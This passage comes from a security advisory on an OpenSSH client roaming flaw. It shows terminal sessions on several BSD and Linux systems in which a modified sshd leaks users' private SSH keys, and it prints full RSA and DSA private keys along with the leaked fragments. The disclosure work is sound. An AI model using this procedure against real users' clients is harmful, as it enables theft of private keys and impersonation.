  connects the client to the server, but if a disconnection occurs, and
  the SIGCHLD of the terminated ProxyCommand is caught while fgetc() is
  waiting for a '\n' or '\r' on stdin, EOF is returned (the underlying
  read() returns EINTR) and the client exit()s before it can reconnect
  to the server:

$ /usr/bin/ssh -V
OpenSSH_6.6.1p1 Ubuntu-2ubuntu2, OpenSSL 1.0.1f 6 Jan 2014

$ /usr/bin/ssh -o ProxyCommand="/bin/nc %h %p" -p 222 127.0.0.1
user@127.0.0.1's password:
[connection suspended, press return to resume][exiting]

  This behavior is intriguing, because (at least on Linux and BSD) the
  signal() call that installed the main_sigchld_handler() is supposed to
  be equivalent to a sigaction() call with SA_RESTART. However, portable
  versions of OpenSSH override signal() with mysignal(), a function that
  calls sigaction() without SA_RESTART.

  This last mitigating factor is actually a race-condition bug that
  depends on the ProxyCommand itself: for example, the client never
  fails to reconnect to the server when using Socat as a ProxyCommand,
  but fails occasionally when using Netcat.

------------------------------------------------------------------------
Private Key Disclosure example: FreeBSD 10.0, 2048-bit RSA key
------------------------------------------------------------------------

$ head -n 1 /etc/motd
FreeBSD 10.0-RELEASE (GENERIC) #0 r260789: Thu Jan 16 22:34:59 UTC 2014

$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-freebsd 11 Feb 2013

$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA3GKWpUCOmK05ybfhnXTTzWAXs5A0FufmqlihRKqKHyflYXhr
qlcdPH4PvbAhkc8cUlK4c/dZxNiyD04Og1MVwVp2kWp9ZDOnuLhTR2mTxYjEy+1T
M3/74toaLj28kwbQjTPKhENMlqe+QVH7pH3kdun92SEqzKr7Pjx4/2YzAbAlZpT0
9Zj/bOgA7KYWfjvJ0E9QQZaY68nEB4+vIK3agB6+JT6lFjVnSFYiNQJTPVedhisd
a3KoK33SmtURvSgSLBqO6e9uPzV87nMfnSUsYXeej6yJTR0br44q+3paJ7ohhFxD
zzqpKnK99F0uKcgrjc3rF1EnlyexIDohqvrxEQIDAQABAoIBAQDHvAJUGsIh1T0+
eIzdq3gZ9jEE6HiNGfeQA2uFVBqCSiI1yHGrm/A/VvDlNa/2+gHtClNppo+RO+OE
w3Wbx70708UJ3b1vBvHHFCdF3YWzzVSujZSOZDvhSVHY/tLdXZu9nWa5oFTVZYmk
oayzU/WvYDpUgx7LB1tU+HGg5vrrVw6vLPDX77SIJcKuqb9gjrPCWsURoVzkWoWc
bvba18loP+bZskRLQ/eHuMpO5ra23QPRmb0p/LARtBW4LMFTkvytsDrmg1OhKg4C
vcbTu2WOK1BqeLepNzTSg2wHtvX8DRUJvYBXKosGbaoIOFZvohoqSzKFs+R3L3GW
hZz9MxCRAoGBAPITboUDMRmvUblU58VW85f1cmPvrWtFu7XbRjOi3O/PcyT9HyoW
bc3HIg1k4XgHk5+F9r5+eU1CiUUd8bOnwMEUTkyr7YH/es+O2P+UoypbpPCfEzEd
muzCFN1kwr4RJ5RG7ygxF8/h/toXua1nv/5pruro+G+NI2niDtaPkLdfAoGBAOkP
wn7j8F51DCxeXbp/nKc4xtuuciQXFZSz8qV/gvAsHzKjtpmB+ghPFbH+T3vvDCGF
iKELCHLdE3vvqbFIkjoBYbYwJ22m4y2V5HVL/mP5lCNWiRhRyXZ7/2dd2Jmk8jrw
sj/akWIzXWyRlPDWM19gnHRKP4Edou/Kv9Hp2V2PAoGBAInVzqQmARsi3GGumpme
vOzVcOC+Y/wkpJET3ZEhNrPFZ0a0ab5JLxRwQk9mFYuGpOO8H5av5Nm8/PRB7JHi
/rnxmfPGIWJX2dG9AInmVFGWBQCNUxwwQzpz9/VnngsjMWoYSayU534SrE36HFtE
K+nsuxA+vtalgniToudAr6H5AoGADIkZeAPAmQQIrJZCylY00dW+9G/0mbZYJdBr
+7TZERv+bZXaq3UPQsUmMJWyJsNbzq3FBIx4Xt0/QApLAUsa+l26qLb8V+yDCZ+n
UxvMSgpRinkMFK/Je0L+IMwua00w7jSmEcMq0LJckwtdjHqo9rdWkvavZb13Vxh7
qsm+NEcCgYEA3KEbTiOU8Ynhv96JD6jDwnSq5YtuhmQnDuHPxojgxSafJOuISI11
1+xJgEALo8QBQT441QSLdPL1ZNpxoBVAJ2a23OJ/Sp8dXCKHjBK/kSdW3U8SJPjV
pmvQ0UqnUpUj0h4CVxUco4C906qZSO5Cemu6g6smXch1BCUnY0TcOgs=
-----END RSA PRIVATE KEY-----

# env ROAMING="client_out_buf_size:1280" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f
/etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
user@127.0.0.1's password:
[connection suspended, press return to resume][connection resumed]

# cat /tmp/roaming-97ed9f59/infoleak
MIIEpQIBAAKCAQEA3GKWpUCOmK05ybfhnXTTzWAXs5A0FufmqlihRKqKHyflYXhr
qlcdPH4PvbAhkc8cUlK4c/dZxNiyD04Og1MVwVp2kWp9ZDOnuLhTR2mTxYjEy+1T
M3/74toaLj28kwbQjTPKhENMlqe+QVH7pH3kdun92SEqzKr7Pjx4/2YzAbAlZpT0
9Zj/bOgA7KYWfjvJ0E9QQZaY68nEB4+vIK3agB6+JT6lFjVnSFYiNQJTPVedhisd
a3KoK33SmtURvSgSLBqO6e9uPzV87nMfnSUsYXeej6yJTR0br44q+3paJ7ohhFxD
zzqpKnK99F0uKcgrjc3rF1EnlyexIDohqvrxEQIDAQABAoIBAQDHvAJUGsIh1T0+
eIzdq3gZ9jEE6HiNGfeQA2uFVBqCSiI1yHGrm/A/VvDlNa/2+gHtClNppo+RO+OE
w3Wbx70708UJ3b1vBvHHFCdF3YWzzVSujZSOZDvhSVHY/tLdXZu9nWa5oFTVZYmk
oayzU/WvYDpUgx7LB1tU+HGg5vrrVw6vLPDX77SIJcKuqb9gjrPCWsURoVzkWoWc
bvba18loP+bZskRLQ/eHuMpO5ra23QPRmb0p/LARtBW4LMFTkvytsDrmg1OhKg4C
vcbTu2WOK1BqeLepNzTSg2wHtvX8DRUJvYBXKosGbaoIOFZvohoqSzKFs+R3L3GW
hZz9MxCRAoGBAPITboUDMRmvUblU58VW85f1cmPvrWtFu7XbRjOi3O/PcyT9HyoW
bc3HIg1k4XgHk5+F9r5+eU1CiUUd8bOnwMEUTkyr7YH/es+O2P+UoypbpPCfEzEd
muzCFN1kwr4RJ5RG7ygxF8/h/toXua1nv/5pruro+G+NI2niDtaPkLdfAoGBAOkP
wn7j8F51DCxeXbp/nKc4xtuuciQXFZSz8qV/gvAsHzKjtpmB+ghPFbH+T3vvDCGF
iKELCHLdE3vvqbFIkjoBYbYwJ22m4y2V5HVL/mP5lCNWiRhRyXZ7/2dd2Jmk8jrw
sj/akWIzXWyRlPDWM19gnHRKP4Edou/Kv9Hp2V2PAoGBAInVzqQmARsi3GGumpme

------------------------------------------------------------------------
Private Key Disclosure example: FreeBSD 9.2, 1024-bit DSA key
------------------------------------------------------------------------

$ head -n 1 /etc/motd
FreeBSD 9.2-RELEASE (GENERIC) #0 r255898: Fri Sep 27 03:52:52 UTC 2013

$ /usr/bin/ssh -V
OpenSSH_6.2p2, OpenSSL 0.9.8y 5 Feb 2013

$ cat ~/.ssh/id_dsa
-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQCEfEo25eMTu/xrpVQxBGEjW/WEfeH4jfqaCDluPBlcl5dFd8KP
grGm6fh8c+xdNYRg+ogHwM3uDG5aY62X804UGysCUoY5isSDkkwGrbbemHxR/Cxe
4bxlIbQrw8KY39xLOY0hC5mpPnB01Cr+otxanYUTpsb8gpEngVvK619O0wIVAJwY
8RLHmLnPaMFSOvYvGW6eZNgtAoGACkP73ltWMdHM1d0W8Tv403yRPaoCRIiTVQOw
oM8/PQ1JVFmBJxrJXtFJo88TevlDHLEghapj4Wvpx8NJY917bC425T2zDlJ4L9rP
IeOjqy+HwGtDXjTHspmGy59CNe8E6vowZ3XM4HYH0n4GcwHvmzbhjJxYGmGJrng4
cRh4VTwCgYAPxVV+3eA46WWZzlnttzxnrr/w/9yUC/DfrKKQ2OGSQ9zyVn7QEEI+
iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To
zEpLjvCtyTJcJgz2oHglVUJqGAx8CQJq2wS+eiSQqJbQpmexNa5GfwIUKbRxQKlh
PHatTfiy5p82Q8+TD60=
-----END DSA PRIVATE KEY-----

# env ROAMING="client_out_buf_size:768" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f
/etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
[connection suspended, press return to resume][connection resumed]

# cat /tmp/roaming-9448bb7f/infoleak
MIIBugIBAAKBgQCEfEo25eMTu/xrpVQxBGEjW/WEfeH4jfqaCDluPBlcl5dFd8KP
grGm6fh8c+xdNYRg+ogHwM3uDG5aY62X804UGysCUoY5isSDkkwGrbbemHxR/Cxe
4bxlIbQrw8KY39xLOY0hC5mpPnB01Cr+otxanYUTpsb8gpEngVvK619O0wIVAJwY
8RLHmLnPaMFSOvYvGW6eZNgtAoGACkP73ltWMdHM1d0W8Tv403yRPaoCRIiTVQOw
oM8/PQ1JVFmBJxrJXtFJo88TevlDHLEghapj4Wvpx8NJY917bC425T2zDlJ4L9rP
IeOjqy+HwGtDXjTHspmGy59CNe8E6vowZ3XM4HYH0n4GcwHvmzbhjJxYGmGJrng4
cRh4VTwCgYAPxVV+3eA46WWZzlnttzxnrr/w/9yUC/DfrKKQ2OGSQ9zyVn7QEEI+
iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To
...

# env ROAMING="client_out_buf_size:1024" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f
/etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
[connection suspended, press return to resume][connection resumed]

# cat /tmp/roaming-279f5e2b/infoleak
...
iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To
zEpLjvCtyTJcJgz2oHglVUJqGAx8CQJq2wS+eiSQqJbQpmexNa5GfwIUKbRxQKlh
PHatTfiy5p82Q8+TD60=
...

------------------------------------------------------------------------
Private Key Disclosure example: OpenBSD 5.4, 2048-bit RSA key
------------------------------------------------------------------------

$ head -n 1 /etc/motd
OpenBSD 5.4 (GENERIC) #37: Tue Jul 30 15:24:05 MDT 2013

$ /usr/bin/ssh -V
OpenSSH_6.3, OpenSSL 1.0.1c 10 May 2012

$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAzjortydu20T6wC6BhFzKNtVJ9uYSMOjWlghws4OkcXQtu+Cc
VEhdal/HFyKyiNMAUDMi0gjOHsia8X4GS7xRNwSjUHOXnrvPne/bGF0d4DAxfAFL
9bOwoNnBIEFci37YMOcGArvrEJ7hbjJhGTudekRU78IMOichpdYtkpkGUyGmf175
ynUpCcJdzngL8yF9Iezc8bfXAyIJjzjXmSVu9DypkeUBW28qIuMr5ksbekHcXhQn
w8Y2oEDeyPSGIdWZQcVpdfaAk+QjCEs84c0/AvZoG2iY85OptjNDfynFJSDR5muU
MANXJm5JFfC89fy0nGkQJa1FfNpPjUQY8hWz7QIDAQABAoIBAQC36R6FJrBw8PIh
oxezv8BB6DIe8gx0+6AqinpfTN3Ao9gJPYSMkUBlleaJllLbPDiCTSgXYOzYfRPY
mwfoUJeo1gUCwSMM1vaPJZEhCCGVhcULjmh8RHQW7jqRllh+um74JX6xv34hA1+M
k3cONqD4oamRa17WGYGjT/6yRq9iP/0AbBT+haRKYC4nKWrdkqEJXk10pM2kmH6G
+umbybQrGrPf854VqOdftoku0WjBKrD0hsFZbB24rYmFj+cmbx+cDEqt03xjw+95
n5xM/97jqB6rzkPAdRUuzNec+QNGMvA+4YpItF1vdEfd0N3Jl/VIQ+8ZAhANnvCt
8uRHC7OhAoGBAO9PqmApW1CY+BeYDyqGduLwh1HVVZnEURQJprenOtoNxfk7hkNw
rsKKdc6alWgTArLTEHdULU8GcZ6C0PEcszk2us3AwfPKko8gp2PD5t/8IW0cWxT5
cMxcelFydu8MuikFthqNEX4tPNrZy4FZlOBGXCYlhvDqHk+U7kVIhkLFAoGBANyb
3pLYm7gEs9zoL5HxEGvk9x2Ds9PlULcmc//p+4HCegE0tehMaGtygQKRQFuDKOJV
WGKRjgls7vVXeVI2RABtYsT6OSBU9kNQ01EHzjOqN53O43e6GB4EA+W/GLEsffOZ
pCw09bOVvgClicyekO3kv0lsVvIfAWgxVQY0oZ8JAoGBAIyisquEYmeBHfsvn2oM
T32agMu0pXOSDVvLODChlFJk2b1YH9UuOWWWXRknezoIQgO5Sen2jBHu5YKTuhqY
FTNAWJNl/hU5LNv0Aqr8i4eB8lre2SAAXyuaBUAsFnzxa82Dz7rWwDr4dtTePVws
uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn
zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF
ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1
/tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk
kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS
Y1tzYFyta0xSod/NGoUd673IgfLnfiGMOLhy+9qhhwCqF10RiS0=
-----END RSA PRIVATE KEY-----

# env ROAMING="client_out_buf_size:2048" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f
/etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
user@127.0.0.1's password:
[connection suspended, press return to resume][connection resumed]

# cat /tmp/roaming-35ee7ab0/infoleak
MIIEogIBAAKCAQEAzjortydu20T6wC6BhFzKNtVJ9uYSMOjWlghws4OkcXQtu+Cc
VEhdal/HFyKyiNMAUDMi0gjOHsia8X4GS7xRNwSjUHOXnrvPne/bGF0d4DAxfAFL
9bOwoNnBIEFci37YMOcGArvrEJ7hbjJhGTudekRU78IMOichpdYtkpkGUyGmf175
ynUpCcJdzngL8yF9Iezc8bfXAyIJjzjXmSVu9DypkeUBW28qIuMr5ksbekHcXhQn
w8Y2oEDeyPSGIdWZQcVpdfaAk+QjCEs84c0/AvZoG2iY85OptjNDfynFJSDR5muU
MANXJm5JFfC89fy0nGkQJa1FfNpPjUQY8hWz7QIDAQABAoIBAQC36R6FJrBw8PIh
oxezv8BB6DIe8gx0+6AqinpfTN3Ao9gJPYSMkUBlleaJllLbPDiCTSgXYOzYfRPY
mwfoUJeo1gUCwSMM1vaPJZEhCCGVhcULjmh8RHQW7jqRllh+um74JX6xv34hA1+M
k3cONqD4oamRa17WGYGjT/6yRq9iP/0AbBT+haRKYC4nKWrdkqEJXk10pM2kmH6G
+umbybQrGrPf854VqOdftoku0WjBKrD0hsFZbB24rYmFj+cmbx+cDEqt03xjw+95
n5xM/97jqB6rzkPAdRUuzNec+QNGMvA+4YpItF1vdEfd0N3Jl/VIQ+8ZAhANnvCt
8uRHC7OhAoGBAO9PqmApW1CY+BeYDyqGduLwh1HVVZnEURQJprenOtoNxfk7hkNw
rsKKdc6alWgTArLTEHdULU8GcZ6C0PEcszk2us3AwfPKko8gp2PD5t/8IW0cWxT5
cMxcelFydu8MuikFthqNEX4tPNrZy4FZlOBGXCYlhvDqHk+U7kVIhkLFAoGBANyb
3pLYm7gEs9zoL5HxEGvk9x2Ds9PlULcmc//p+4HCegE0tehMaGtygQKRQFuDKOJV
WGKRjgls7vVXeVI2RABtYsT6OSBU9kNQ01EHzjOqN53O43e6GB4EA+W/GLEsffOZ
pCw09bOVvgClicyekO3kv0lsVvIfAWgxVQY0oZ8JAoGBAIyisquEYmeBHfsvn2oM
T32agMu0pXOSDVvLODChlFJk2b1YH9UuOWWWXRknezoIQgO5Sen2jBHu5YKTuhqY
FTNAWJNl/hU5LNv0Aqr8i4eB8lre2SAAXyuaBUAsFnzxa82Dz7rWwDr4dtTePVws
uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn
zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF
ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1
/tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk
kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS

$ /usr/bin/ssh -p 222 127.0.0.1
user@127.0.0.1's password:
[connection suspended, press return to resume][connection resumed]

# cat /tmp/roaming-6cb31d82/infoleak
...
uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn
zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF
ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1
/tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk
kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS
Y1tzYFyta0xSod/NGoUd673IgfLnfiGMOLhy+9qhhwCqF10RiS0=

------------------------------------------------------------------------
Private Key Disclosure example: OpenBSD 5.8, 2048-bit RSA key
------------------------------------------------------------------------

$ head -n 1 /etc/motd
OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015

$ /usr/bin/ssh -V
OpenSSH_7.0, LibreSSL 2.2.2

$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwe9ssfYbABhOGxnBDsPf5Hwypr3tVz4ZCK2Q9ZWWBYnk+KVL
ruLv7NWzeuKF7ls8z4SdpP/09QIIWQO5xWmQ7OM7ndfHWexFoyS/MijorHLvwG1s
17KFF8aC5vcBTfVkWnFaERueyd+mxv+oIrskA3/DK7/Juojkq70aPAdafiWOuVT8
L/2exFuzpSmwiXbPuiPgImO9O+9VQ4flZ4qlO18kZxXF948GisxxkceOYWTIX6uh
xSs/NEGF/drmB4RTAL1ZivG+e4IMxs5naLz4u3Vb8WTDeS6D62WM1eq5JRdlZtGP
vavL01Kv3sYFvoD0OPUU4BjU8bd4Qb30C3719wIDAQABAoIBAG4zFpipN/590SQl
Jka1luvGhyGoms0QRDliJxTlwzGygaGoi7D800jIxgv13BTtU0i4Grw/lXoDharP
Kyi6K9fv51hx3J2EXK2vm9Vs2YnkZcf6ZfbLQkWYT5nekacy4ati7cL65uffZm19
qJTTsksqtkSN3ptYXlgYRGgH5av3vaTSTGStL8D0e9fcrjSdN0UntjBB7QGT8ZnY
gQ1bsSlcPM/TB6JYmHWdpCAVeeCJdDhYoHKlwgQuTdpubdlM80f6qat7bsm95ZTK
QolQFpmAXeU4Bs5kFlm0K0qYFkWNdI16ScOpK6AQZGUTcHICeRL3GEm6NC0HYBNt
gKHPucECgYEA7ssL293PZR3W9abbivDxvtCjA+41L8Rl8k+J0Dj0QTQfeHxHD2eL
cQO2lx4N3E9bJMUnnmjxIT84Dg7SqOWThh3Rof+c/vglyy5o/CzbScISQTvjKfuB
+s5aNojIqkyKaesQyxmdacLxtBBppZvzCDTHBXvAe4t8Bus2DPBzbzsCgYEAz+jl
hcsMQ1egiVVpxHdjtm3+D1lbgITk0hzIt9DYEIMBJ7y5Gp2mrcroJAzt7VA2s7Ri
hBSGv1pjz4j82l00odjCyiUrwvE1Gs48rChzT1PcQvtPCCanDvxOHwpKlUTdUKZh
vhxPK/DW3IgUL0MlaTOjncR1Zppz4xpF/cSlYHUCgYB0MhVZLXvHxlddPY5C86+O
nFNWjEkRL040NIPo8G3adJSDumWRl18A5T+qFRPFik/depomuQXsmaibHpdfXCcG
8eeaHpm0b+dkEPdBDkq+f1MGry+AtEOxWUwIkVKjm48Wry2CxroURqn6Zqohzdra
uWPGxUsKUvtNGpM4hKCHFQKBgQCM8ylXkRZZOTjeogc4aHAzJ1KL+VptQKsYPudc
prs0RnwsAmfDQYnUXLEQb6uFrVHIdswrGvdXFuJ/ujEhoPqjlp5ICPcoC/qil5rO
ZAX4i7PRvSoRLpMnN6mGpaV2mN8pZALzraGG+pnPnHmCqRTdw2Jy/NNSofdayV8V
8ZDkWQKBgQC2pNzgDrXLe+DIUvdKg88483kIR/hP2yJG1V7s+NaDEigIk8BO6qvp
ppa4JYanVDl2TpV258nE0opFQ66Q9sN61SfWfNqyUelZTOTzJIsGNgxDFGvyUTrz
uiC4d/e3Jlxj21nUciQIe4imMb6nGFbUIsylUrDn8GfA65aePLuaSg==
-----END RSA PRIVATE KEY-----

# "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h
/etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -o ProxyCommand="/usr/bin/nc -w 1 %h %p" -p 222 127.0.0.1
[connection suspended, press return to resume]Segmentation fault (core dumped)

(this example requires a ProxyCommand because of the NULL-aitop bug
described in the Mitigating Factors of the Information Leak section, and
crashes because of the NULL-pointer dereference discussed in the
Mitigating Factors of the Buffer Overflow section)

# cat /tmp/roaming-a5eca355/infoleak
ry+AtEOxWUwIkVKjm48Wry2CxroURqn6Zqohzdra
uWPGxUsKUvtNGpM4hKCHFQKBgQCM8ylXkRZZOTjeogc4aHAzJ1KL+VptQKsYPudc
prs0RnwsAmfDQYnUXLEQb6uFrVHIdswrGvdXFuJ/ujEhoPqjlp5ICPcoC/qil5rO
ZAX4i7PRvSoRLpMnN6mGpaV2mN8pZALzraGG+pnPnHmCqRTdw2Jy/NNSofdayV8V
8ZDkWQKBgQC2pNzgDrXLe+DIUvdKg88483kIR/hP2yJG1V7s+NaDEigIk8BO6qvp
ppa4JYanVDl2TpV258nE0opFQ66Q9sN61SfWfNqyUelZTOTzJIsGNgxDFGvyUTrz
uiC4d/e3Jlxj21nUciQIe4imMb6nGFbUIsylUrDn8GfA65aePLuaSg==

------------------------------------------------------------------------
Private Key Disclosure example: CentOS 7, 1024-bit DSA key
------------------------------------------------------------------------

$ grep PRETTY_NAME= /etc/os-release
PRETTY_NAME="CentOS Linux 7 (Core)"

$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013

$ cat ~/.ssh/id_dsa
-----BEGIN DSA PRIVATE KEY-----
MIIBvQIBAAKBgQDmjJYHvennuPmKGxfMuNc4nW2Z1via6FkkZILWOO1QJLB5OXqe
kt7t/AAr+1n0lJbC1Q8hP01LFnxKoqqWfHQIuQL+S88yr5T8KY/VxV9uCVKpQk5n
GLnZn1lmDldNaqhV0ECESXZVEpq/8TR2m2XjSmE+7Y14hI0cjBdnOz2X8wIVAP0a
Nmtvmc4H+iFvKorV4B+tqRmvAoGBAKjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC
o7l7mJT+lI9vTrQsu3QCLAUZnmVHAIj/m9juk8kXkZvEBXJuPVdL0tCRNAsCioD2
hUaU7sV6Nho9fJIclxuxZP8j+uzidQKKN/+CVbQougsLsBlstpuQ4Hr2DHmalL8X
iISkLhuyAoGBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l
B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZN2hfXITp9/4oatxFUV5V8aniqyq4Kwj/
QlCmHO7eRlPArhylx8uRnoHkbTRe+by5fmPImz/3WUtgPnx8y3NOEsCtAhUApdtS
F9AoVoZFKEGn4FEoYIqY3a4=
-----END DSA PRIVATE KEY-----

# env ROAMING="heap_massaging:linux" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f
/etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key

$ /usr/bin/ssh -p 222 127.0.0.1
...

# strings /tmp/roaming-b7b16dfc/infoleak
jJYHvennuPmKGxfMuNc4nW2Z1via6FkkZILWOO1QJLB5OXqe
kt7t/AAr+1n0lJbC1Q8hP01LFnxKoqqWfHQIuQL+S88yr5T8KY/VxV9uCVKpQk5

# strings /tmp/roaming-b324ce87/infoleak
IuQL
R2m2XjSmE+7Y14hI0cjBdnOz2X8wIVAP0a
Nmtvmc4H+iFvKorV4B+tqRmvAoGBAKjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC
o7l7mJT+lI9v

# strings /tmp/roaming-24011739/infoleak
KjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC
o7l7mJT+lI9vTrQsu3QCLAUZnmVHAIj/m9juk8kXkZvEBXJuPVdL0tCRNAsC

# strings /tmp/roaming-37456846/infoleak
LsBlstpuQ4Hr2DHmalL8X
iISkLhuyAoGBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l
B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZNA
yq4Kwj/

# strings /tmp/roaming-988ff54c/infoleak
GBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l
B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZN2hfXITp9/4oatxFUV5V8aniqyq4Kwj/

# strings /tmp/roaming-53887fa5/infoleak
/4oatxFUV5V8aniqyq4Kwj/
QlCmHO7eRlPArhylx8uRnoHkbTRe+by5fmPImz/3WUtgPnx8y3NOEsCtAhUApdtS
F9AoVoZFKEGn4FEoYIqY3a4

------------------------------------------------------------------------
Private Key Disclosure example: Fedora 20, 2048-bit RSA key
------------------------------------------------------------------------

$ grep PRETTY_NAME= /etc/os-release
PRETTY_NAME="Fedora 20 (Heisenbug)"

$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013

$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmbj/XjOppLWSAhuLKiRoHsdp66LJdY2PvP0ht3GWDKKCk7Gz
HLas5VjotS9rmupavGGDiicMHPClOttWAI9MRyvP77iZhSei/RzX1/UKk/broTDp
o9ljBnQTzRAyw8ke72Ih77SOGfOLBvYlx80ZmESLYYH95aAeuuDvb236JnsgRPDQ
/B/gyRIhfqis70USi05/ZbnAenFn+v9zoSduDYMzSM8mFmh9f+9PVb9qMHdfNkIy
2E78kt9BknU/bEcCWyL+IXNLV0rgRGAcE0ncKu13YvuH/7o4Q7bW2FYErT4P/FHK
cRmpbVfAzJQb85uXUXaNLVW0A/gHqTaGCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt
j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CGLj61BS8CfKVp9V7+Gc4P/o
6GEmk/oB9w9gf1zGqWkTytMiqcawMW4LZAJlSI/rGWe7lYHuceZSSgzd5lF4VP06
Xz/wTMkSDZh/M6zOnQhImcLforsiPbTKKIVLL6u13VUmDcYfaBh9VepjyN8i+KIV
JQB26MlXSxuAp8o0BQUI8FY/dsObJ9xjMT/u2+prtAxpPNfKElEV7ZPBrTRAuCUr
Hiy7yflZ3w0qHekNafX/tnWiU4zi/p6aD4rs10YaYSnSolsDs2k8wHbVP4VtLE8l
PRfXS6ECgYEAyVf7Pr3TwTa0pPEk1dLz3XHoetTqUND/0Kv+i7MulBzJ4LbcsTEJ
rtOuGGpLrAYlIvCgT+F26mov5fRGsjjnmP3P/PsvzR8Y9DhiWl9R7qyvNznQYxjo
/euhzdYixxIkfqyopnYFoER26u37/OHe37PH+8U1JitVrhv7s4NYztECgYEAw3Ot
gxMqsKh42ydIv1sBg1QEHu0TNvyYy7WCB8jnMsygUQ8EEJs7iKP//CEGRdDAwyGa
jwj3EZsXmtP+wd3fhge7pIHp5RiKfBn0JtSvXQQHO0k0eEcQ4aA/6yESI62wOuaY
vJ+q7WMo1wHtMoqRPtW/OAxUf91dQRtzK/GpRuMCgYAc7lh6vnoT9FFmtgPN+b7y
3fBC3h9BN5banCw6VKfnvm8/q+bwSxSSG3aTqYpwEH37lEnk0IfuzQ1O5JfX+hdF
Q4tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmTOun5zVV6EixsmDn80P
pdyhj8fAUU/BceHr/H6hUQKBgCX5SqPlzGyIPvrtVf//sXqPj0Fm9E3Bo/ooKLxU
dz7ybM9y6GpFjrqMioa07+AOn/UJiVry9fXQuTRWre+CqRQEWpuqtgPR0c4syLfm
qK+cwb7uCSi5PfloRiLryPdvnobDGLfFGdOHaX7km+4u5+taYg2Er8IsAxtMNwM5
r5bbAoGAfxRRGMamXIha8xaJwQnHKC/9v7r79LPFoht/EJ7jw/k8n8yApoLBLBYp
P/jXU44sbtWB3g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCBqosVbEQhNKZAj+
ZS16+aH97RKdJD/4qiskzzHvZs+wi4LKPHHHz7ETXr/m4CRfMIU=
-----END RSA PRIVATE KEY-----

